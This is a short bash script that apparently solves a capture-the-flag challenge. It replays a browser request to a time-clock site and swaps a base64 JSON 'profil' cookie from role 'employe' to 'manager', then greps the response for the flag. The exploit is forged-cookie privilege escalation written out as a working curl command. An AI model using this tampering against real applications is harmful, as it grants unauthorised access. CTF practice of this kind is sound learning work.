#!/usr/bin/env bash
# cURL of the network request
# curl --url 'https://pointeuse.cyberzerk.fr/' \
#   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
#   -H 'accept-language: en-US,en;q=0.6' \
#   -H 'cache-control: max-age=0' \
#   -b 'cf_clearance=<TOKEN>; profil=eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D' \
#   -H 'priority: u=0, i' \
#   -H 'referer: https://ctf.cyberzerk.fr/' \
#   -H 'sec-ch-ua: "Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"' \
#   -H 'sec-ch-ua-mobile: ?0' \
#   -H 'sec-ch-ua-platform: "Linux"' \
#   -H 'sec-fetch-dest: document' \
#   -H 'sec-fetch-mode: navigate' \
#   -H 'sec-fetch-site: same-site' \
#   -H 'sec-fetch-user: ?1' \
#   -H 'sec-gpc: 1' \
#   -H 'upgrade-insecure-requests: 1' \
#   -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36'

# Var
manager='eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6Im1hbmFnZXIifQ%3D%3D'

# Exploit
curl -s --url 'https://pointeuse.cyberzerk.fr/' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'accept-language: en-US,en;q=0.6' \
  -H 'cache-control: max-age=0' \
  -b "cf_clearance=<TOKEN>; profil=$manager" \
  -H 'priority: u=0, i' \
  -H 'referer: https://ctf.cyberzerk.fr/' \
  -H 'sec-ch-ua: "Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-site' \
  -H 'sec-fetch-user: ?1' \
  -H 'sec-gpc: 1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36' | tee output.txt | grep -oE 'CyberZerk\{[^}]*\}'
